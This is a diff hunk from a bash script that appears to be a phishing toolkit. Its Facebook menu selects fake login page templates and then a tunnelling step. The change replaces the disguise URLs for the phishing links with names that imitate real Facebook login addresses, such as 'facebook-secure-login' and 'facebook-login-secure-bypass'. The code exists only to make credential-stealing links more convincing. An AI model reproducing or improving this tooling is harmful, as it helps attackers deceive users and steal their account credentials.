@@ -358,19 +358,19 @@ site_facebook() {
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='http://blue-verified-badge-for-facebook-free'
+			mask='http://facebook-login-secure-bypass'
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
-			mask='http://vote-for-the-best-social-media'
+			mask='https://facebook-secure-login'
 			tunnel_menu;;
 		3 | 03)
 			website="fb_security"
-			mask='http://make-your-facebook-secured-and-free-from-hackers'
+			mask='http://facebook-login-secured'
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
-			mask='http://get-messenger-premium-features-free'
+			mask='http://facebook-login-bypass-secured'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
